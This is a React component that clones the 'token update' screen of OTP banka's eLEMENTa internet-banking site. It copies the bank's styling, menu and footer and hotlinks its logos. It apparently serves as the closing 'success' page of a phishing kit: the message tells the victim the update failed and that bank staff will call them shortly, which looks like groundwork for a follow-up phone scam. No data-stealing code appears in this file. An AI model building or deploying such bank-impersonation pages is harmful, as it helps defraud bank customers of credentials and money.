import "src/assets/success/reset.css";
import "src/assets/success/menu.css";

import "src/assets/success/otp.css";
import "src/assets/success/body.css";

function SuccessPage() {
	return (
		<div>
			<meta httpEquiv="Content-Type" content="text/html; charset=UTF-8" />
			<title>eLEMENT@--Autorizacija--</title>
			<style
				dangerouslySetInnerHTML={{
					__html:
						"\n#wrap {\n \n    background-position: 0 80px;\n\n}\n#naslov {\n    height: 52px;\n    margin-left: 0;\n    margin-right: 0;\n    padding-top: 3px;\n    width: 817px;\n}\n#allcontentlogin {\n    /*background-color: #FFFFFF;*/\n    margin-bottom: 0;\n    margin-left: auto;\n    margin-right: auto;\n    margin-top: 0;\n    padding-bottom: 2px;\n    padding-top: 0;\n    position: relative;\n    width: 1022px;\n}\n#loginvisina{\n\theight:600px;\n\tbackground:#ffffff;\n}\n#sadrzajsredinalogin {\n    height: auto;\n    margin-left: 100px;\n    margin-right: 0;\n    min-height: 740px;\n    width: 817px;\n}\n\n.headernaziv2 {\n    font-family: Arial,Helvetica,sans-serif;\n    font-size: 12px;\n    text-align: right;\n    padding-left: 10px;\n    font-weight: bold;\n    margin-top:0;\n    text-indent: 0;\n    /*color: #A2D229;*/\n    color: #343434;\n    /*font-style:italic;*/\n    padding: 3px;\n    /*border-bottom: 1px solid #75B531;\n    border-right:1px solid #75B531 ;*/\n}\ninput.btn{display:inline-block;height:24px;padding:0 7px 0 7px;margin:0 7px 0 0;font-size:11px;font-weight:bold;line-height:20px;color:#333;text-align:center; vertical-align:middle;text-shadow:0 1px 0 rgba(255, 255, 255, 0.8);border:solid 1px #999;float:left;cursor:pointer;text-decoration:none;-webkit-user-select:none;-khtml-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;*zoom:1;-webkit-box-shadow:0px 1px 1px 0px rgba(0, 0, 0, 0.05),inset 0px 1px 0px 0px #ffffff;-moz-box-shadow:0px 1px 1px 0px rgba(0, 0, 0, 0.05),inset 0px 1px 0px 0px #ffffff;box-shadow:0px 1px 1px 0px rgba(0, 0, 0, 0.05),inset 0px 1px 0px 0px #ffffff;-webkit-border-radius:3px;-moz-border-radius:3px;border-radius:3px;background-color:#f5f5f5;background-image:-moz-linear-gradient(top, #fafafa, #ededed);background-image:-ms-linear-gradient(top, #fafafa, #ededed);background-image:-webkit-gradient(linear, 0 0, 0 100%, from(#fafafa), to(#ededed));background-image:-webkit-linear-gradient(top, #fafafa, #ededed);background-image:-o-linear-gradient(top, #fafafa, #ededed);background-image:linear-gradient(top, #fafafa, #ededed);background-repeat:repeat-x;filter:progid:DXImageTransform.Microsoft.Gradient(startColorstr='#fafafa', endColorstr='#ededed', GradientType=0);*margin-left:.3em;-webkit-transition:all 0.05s linear;-moz-transition:all 0.05s linear;-ms-transition:all 0.05s linear;-o-transition:all 0.05s linear;transition:all 0.05s linear;}\n/*input.btn{display:inline-block;height:24px;padding:0 7px 0 7px;margin:0 7px 0 0;font-size:11px;font-weight:bold;line-height:20px;color:#333;text-align:center; vertical-align:middle;text-shadow:0 1px 0 rgba(255, 255, 255, 0.8);border:solid 1px #999;float:left;cursor:pointer;text-decoration:none;-webkit-user-select:none;-khtml-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;*zoom:1;-webkit-box-shadow:0px 1px 1px 0px rgba(0, 0, 0, 0.05),inset 0px 1px 0px 0px #ffffff;-moz-box-shadow:0px 1px 1px 0px rgba(0, 0, 0, 0.05),inset 0px 1px 0px 0px #ffffff;box-shadow:0px 1px 1px 0px rgba(0, 0, 0, 0.05),inset 0px 1px 0px 0px #ffffff;-webkit-border-radius:3px;-moz-border-radius:3px;border-radius:3px;background-color:#f5f5f5;background-image:-moz-linear-gradient(top, #CFE67C, #DBEFB3);background-image:-ms-linear-gradient(top, #CFE67C, #DBEFB3);background-image:-webkit-gradient(linear, 0 0, 0 100%, from(#CFE67C), to(#DBEFB3));background-image:-webkit-linear-gradient(top, #CFE67C, #DBEFB3);background-image:-o-linear-gradient(top, #CFE67C, #DBEFB3);background-image:linear-gradient(top, #CFE67C, #DBEFB3);background-repeat:repeat-x;filter:progid:DXImageTransform.Microsoft.Gradient(startColorstr='#CFE67C', endColorstr='#DBEFB3', GradientType=0);*margin-left:.3em;-webkit-transition:all 0.05s linear;-moz-transition:all 0.05s linear;-ms-transition:all 0.05s linear;-o-transition:all 0.05s linear;transition:all 0.05s linear;}*/\ninput.btn:hover{color:#333;background:#fcfcfc;text-decoration:none;-webkit-box-shadow:0px 1px 1px 0px rgba(0, 0, 0, 0.2),inset 0px 1px 0px 0px #ffffff;-moz-box-shadow:0px 1px 1px 0px rgba(0, 0, 0, 0.2),inset 0px 1px 0px 0px #ffffff;box-shadow:0px 1px 1px 0px rgba(0, 0, 0, 0.2),inset 0px 1px 0px 0px #ffffff;}\ninput.btn.active,input.btn:active{outline:0;background-color:#f2f2f2;background-image:-moz-linear-gradient(top, #ededed, #fafafa);background-image:-ms-linear-gradient(top, #ededed, #fafafa);background-image:-webkit-gradient(linear, 0 0, 0 100%, from(#ededed), to(#fafafa));background-image:-webkit-linear-gradient(top, #ededed, #fafafa);background-image:-o-linear-gradient(top, #ededed, #fafafa);background-image:linear-gradient(top, #ededed, #fafafa);background-repeat:repeat-x;filter:progid:DXImageTransform.Microsoft.Gradient(startColorstr='#ededed', endColorstr='#fafafa', GradientType=0);-webkit-box-shadow:0px 1px 1px 0px rgba(255, 255, 255, 0.6),inset 0 1px 3px 0px rgba(0, 0, 0, 0.2);-moz-box-shadow:0px 1px 1px 0px rgba(255, 255, 255, 0.6),inset 0 1px 3px 0px rgba(0, 0, 0, 0.2);box-shadow:0px 1px 1px 0px rgba(255, 255, 255, 0.6),inset 0 1px 3px 0px rgba(0, 0, 0, 0.2);}\ninput.btn.active:hover,input.btn:active:hover{color:#444;}\ninput.btn:focus{outline:thin dotted;outline:5px auto -webkit-focus-ring-color;outline-offset:-2px;}\ninput.btn.disabled,input.btn.disabled:hover,input.btn.disabled:focus,input.btn.disabled:active,input.btn[disabled],input.btn[disabled]:hover,input.btn[disabled]:focus,input.btn[disabled]:active{cursor:default;border:solid 1px rgba(0, 0, 0, 0.25);opacity:0.5;filter:alpha(opacity=50);}\nbutton,input{margin:0;font-size:100%;vertical-align:middle;}\nbutton,input{*overflow:visible;line-height:normal;}\nbutton::-moz-focus-inner,input::-moz-focus-inner{padding:0;border:0;}\ninput {\n\tfont-family: Arial, sans-serif;\n\n}\n\n.tekst_inp {\n\tfont-size: 13px;\n\tborder: 1px solid #b9b9b9;\n\tpadding: 3px;\n\tcolor: #000000;\n\theight:16px;\n}\n.tekst_inpsetfo {\n  font-size: 13px;\n\tborder: 1px solid #b9b9b9;\n\tpadding: 3px;\n\tcolor: #000000;\n\theight:16px;\n  background: #e7f3cc none;\n}\n.titleUpute {\n\tfont: bold 10px Arial, Helvetica, sans-serif;\n\tcolor: #202020;\n\tborder: 1px solid #CEE7A3;\n\tpadding: 2px 4px 2px 4px;\n\t/*background: #E8F2F6;*/\n}\nbody\n{\n\tmargin: 0;\n\tpadding: 0;\n} \n.porukaG {\n\t\tfont: normal bold 12px Arial, Helvetica, sans-serif;\n\t\tcolor: red;\n\t\tborder: 1px solid red;\n\t\tpadding-left: 8px;\n\t\tpadding-top: 2px;\n\t\tpadding-bottom: 2px;\n}\n",
				}}
			/>
			<div id="wrap">
				<div id="allcontentlogin">
					<div id="sadrzajsredinalogin">
						<div id="naslov">
							<div id="menu">
								<div id="scroll_left">
									<a href="javascript:history.back();" />
								</div>
								<div className="menu_container">
									<ul id="main">
										<li>
											<a href="javascript:popUp1('/gradjaniNG/upute/elementa_r.htm', '900', '600')">Upute</a>
										</li>
										<li className="separator">&nbsp;</li>
										<li>
											<a href="javascript:popUp1('/gradjani/html/tecajna_lista.htm', '840', '620');">Tečajna lista</a>
										</li>
										<li className="separator">&nbsp;</li>
										<li>
											<a href="javascript:popUp1('/gradjani/html/tecajni_kalk2.htm', '840', '620')">Tečajni kalkulator</a>
										</li>
										<li className="separator">&nbsp;</li>
										<li>
											<a href="javascript:popUp1('/gradjani/html/dep_kalk_1.htm', '840', '650')">Depozitni kalkulator</a>
										</li>
										<li className="separator">&nbsp;</li>
										<li>
											<a href="javascript:popUp1('/gradjaniNG/kred_kalk/kred_kalk.html', '840', '570')">Kreditni kalkulator</a>
										</li>
										<li className="separator">&nbsp;</li>
										<li>
											<a href="javascript: window.parent.frames['frame'].focus(); window.print();">Ispis</a>
										</li>
									</ul>
								</div>
								<div id="scroll_right">
									<a href="javascript:;" />
								</div>
							</div>
						</div>
						<div id="loginvisina">
							<form name="autorizacija" action="/gradjaniNG/OTPdirekt/nb/eLEMENTa" method="post">
								<input type="HIDDEN" name="fparam" defaultValue={0} />
								<input type="HIDDEN" name="smart_token" defaultValue="T" />
								<input type="HIDDEN" name="preglednik" defaultValue={0} />
								<div></div>
								<table width="813px" cellSpacing={0} cellPadding={0} border={0} align="center">
									<tbody>
										<tr>
											<td>
												<p className="headernaziv" style={{ textAlign: "left", paddingTop: "2px" }}>
													&nbsp;
												</p>
											</td>
										</tr>
									</tbody>
								</table>
								<table width="813px" cellSpacing={0} cellPadding={0} border={0} align="center">
									<tbody>
										<tr>
											<td className="boxIntroToplijevo" />
											<td className="boxIntroTop " height={5}>
												{" "}
											</td>
											<td className="boxIntroTopdesno" />
										</tr>
										<tr>
											<td className="boxIntroMiddlelijevo" />
											<td className="boxIntroMiddle">
												<table width="100%" border={0} cellSpacing={0} cellPadding={0} align="center">
													<tbody>
														<tr>
															<td align="center">
																<img src="https://elementa.otpbanka.hr/gradjani/html/OtpDirektLogo.png" style={{ position: "relative", verticalAlign: "top", marginLeft: "-10px", float: "left" }} />
																<p />
															</td>
														</tr>
														<tr>
															<td align="left">
																<p className="headernaziv" style={{ textAlign: "center" }}>
                                Ažuriranje tokena
																</p>
															</td>
														</tr>
														<tr>
															<td align="center">
																<div style={{ float: "right" }}>
																	<img src="https://elementa.otpbanka.hr/gradjani/html/token.jpg" style={{ position: "relative", verticalAlign: "top", marginTop: "-50px", marginLeft: "-120px" }} />
																	<img src="https://elementa.otpbanka.hr/gradjani/html/mtoken.png" style={{ position: "relative", verticalAlign: "top", marginTop: "-50px", marginLeft: "-20px" }} />
																</div>
																<table width="55%" border={0} cellSpacing={0} cellPadding={0} align="center">
																	<tbody>
																		<tr>
																			<td colSpan={3} height={15} />
																		</tr>
																		<tr>
																		<br/><br/><br/><br/><br/>
																		</tr>
																	
																	
																	
																	</tbody>
																</table>
															</td>
														</tr>
														<tr>
															<td height={5} />
														</tr>
														<tr>
															<td height={25}>
																<table width="100%" height={30} border={0} cellSpacing={0} cellPadding={0} align="center">
																	<tbody>
																		<tr>
																			<td className="porukaG">
																				PORUKA:
																				<br />
																				Ažuriranje nije uspješno izvršeno.
																				<br />
																				U najkraćem roku će Vas telefonski kontaktirati naši službenici, zaduženi za ažuriranje i sigurnost Internet bankarstva
																			</td>
																		</tr>
																	</tbody>
																</table>
															</td>
														</tr>
														<tr>
															<td height={5} />
														</tr>
														{/* <tr>
															<td height={25}>
																<p className="titleUpute">
																	
																	<br />
																	<br />
																
																	<br />
															
																</p>
															</td>
														</tr> */}
													</tbody>
												</table>
											</td>
											<td className="boxIntroMiddledesno" valign="top" />
										</tr>
										<tr>
											<td className="boxIntroBottomlijevo"></td>
											<td className="boxIntroBottom"></td>
											<td className="boxIntroBottomdesno"> </td>
										</tr>
									</tbody>
								</table>
							</form>
						</div>
					</div>
				</div>
			</div>
			<div id="footer">
				<div id="footer_gore">
					<ul>
						<li>
							<a href="https://www.otpbanka.hr" target="_blank">
								OTP banka d.d.
							</a>
						</li>
						<li>
							<a href="https://www.otpbanka.hr/html/kontakti.htm" target="_blank">
								Kontakt centar: 072 201 555
							</a>
						</li>
						<li>
							<a href="https://www.otpbanka.hr/html/opci_uvjeti.htm" target="_blank">
								Opći uvjeti
							</a>
						</li>
						<li>
							<a href="https://www.otpbanka.hr/html/poslovnice.htm" target="_blank">
								Lista poslovnica
							</a>
						</li>
						<li>
							<a href="https://www.otpbanka.hr/pdf/pravila_sigurne_upotrebe_interneta.pdf" target="_blank">
								Pravila sigurne upotrebe interneta
							</a>
						</li>
						<li>
							<a href="https://www.otpbanka.hr/html/g_otpdirekt_mb.htm" target="_blank">
								m-banking
							</a>
						</li>
					</ul>
					<p>© 2013 OTP banka d.d.</p>
				</div>
			</div>
		</div>
	);
}
export default SuccessPage;
